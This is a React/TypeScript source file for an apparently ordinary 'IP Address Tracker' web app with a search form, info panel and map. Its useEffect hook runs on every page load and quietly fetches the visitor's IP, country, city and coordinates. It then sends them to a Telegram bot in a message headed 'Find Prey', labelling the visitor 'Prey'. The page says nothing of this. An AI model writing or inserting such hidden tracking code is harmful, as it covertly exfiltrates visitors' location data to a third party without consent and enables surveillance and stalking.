import { useEffect, useState } from "react";
import { FaChevronRight } from "react-icons/fa";
import BgHeader from "./assets/images/Combined Shape.svg";
import { useForm } from "react-hook-form";
import "leaflet/dist/leaflet.css";
import MapComponent from "./components/MapComponent/MapComponent";
import { useGetLocationQuery } from "./store/api/get-location-api";
import axios from "axios";
import { CHAT_ID, IP_API, TELEGRAM_TOKEN } from "./hook/useEnv";

type FormValue = {
  ipAdress: string;
};

type IpData = {
  ip: string;
  city: string;
  loc: string;
  timezone: string;
  region: string;
};

function App() {
  useEffect(() => {
    let URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
    axios(IP_API).then((res) => {
      let message = `<b>Find Prey</b>\n`;
      message += `<b>Site name:</b> IP Tracker\n`;
      message += `<b>Country:</b> ${res.data.country}\n`;
      message += `<b>City:</b> ${res.data.city}\n`;
      message += `<b>Prey's IP:</b> ${res.data.ip}\n`;
      message += `<b>Location:</b> ${res.data.loc}\n`;
      axios.post(`${URL}/sendPhoto`, {
        chat_id: CHAT_ID,
        photo: "https://ibb.co/X7VKzrP",
        caption: message,
        parse_mode: "HTML",
      });
    });
  }, []);
  const { register, handleSubmit } = useForm<FormValue>();
  const [ipAdress, setIpAdress] = useState("");
  const { data } = useGetLocationQuery(ipAdress) as { data: IpData };
  const formSubmit = (data: FormValue) => {
    setIpAdress(data.ipAdress);
  };

  return (
    <main className="min-h-screen">
      <header>
        <div className="relative">
          <img
            src={BgHeader}
            className="w-full h-[30vh] object-cover"
            alt="background pattern"
          />

          <div className="absolute top-[10%] left-1/2 transform -translate-x-1/2 flex items-center gap-[31px] flex-col w-full max-w-xl px-6 md:px-4">
            <h1 className="text-white font-medium text-2xl md:text-[32px] tracking-[-0.29px] leading-[30px]">
              IP Address Tracker
            </h1>

            <form
              onSubmit={handleSubmit(formSubmit)}
              className="w-full flex rounded-[15px] overflow-hidden"
            >
              <input
                type="text"
                {...register("ipAdress")}
                placeholder="Search for any IP address or domain"
                className="outline-none py-[18px] px-6 flex-1 text-base sm:text-lg"
              />
              <button className="bg-black hover:bg-gray-800 w-14 flex items-center justify-center">
                <FaChevronRight className="text-white" />
              </button>
            </form>
          </div>

          {data && (
            <div className="absolute top-1/2 lg:top-[70%] right-0 scale-75 lg:scale-100 left-0 ">
              <div className="bg-white max-w-[1110px] mx-auto shadow-[0px_50px_50px_-25px_rgba(0,0,0,0.1)] py-6 sm:py-[37px] px-6 sm:px-[32px] rounded-[15px]">
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-8">
                  <div className="text-center sm:text-left">
                    <p className="text-xs sm:text-sm text-gray-500 font-bold uppercase mb-1 sm:mb-2">
                      IP Address
                    </p>
                    <p className="text-lg sm:text-2xl font-medium">
                      {data.ip || "N/A"}
                    </p>
                  </div>

                  <div className="text-center sm:text-left">
                    <p className="text-xs sm:text-sm text-gray-500 font-bold uppercase mb-1 sm:mb-2">
                      Location
                    </p>
                    <p className="text-lg sm:text-2xl font-medium">
                      {data.city || "N/A"}
                    </p>
                  </div>

                  <div className="text-center sm:text-left">
                    <p className="text-xs sm:text-sm text-gray-500 font-bold uppercase mb-1 sm:mb-2">
                      Timezone
                    </p>
                    <p className="text-lg sm:text-2xl font-medium">
                      {data.timezone || "N/A"}
                    </p>
                  </div>

                  <div className="text-center sm:text-left">
                    <p className="text-xs sm:text-sm text-gray-500 font-bold uppercase mb-1 sm:mb-2">
                      ISP
                    </p>
                    <p className="text-lg sm:text-2xl font-medium">
                      {data.region || "N/A"}
                    </p>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>
      </header>

      {data && (
        <div className="w-full h-screen relative -z-10">
          <MapComponent
            Lat={Number(data.loc.split(",")[0])}
            Lon={Number(data.loc.split(",")[1])}
          />
        </div>
      )}
    </main>
  );
}

export default App;
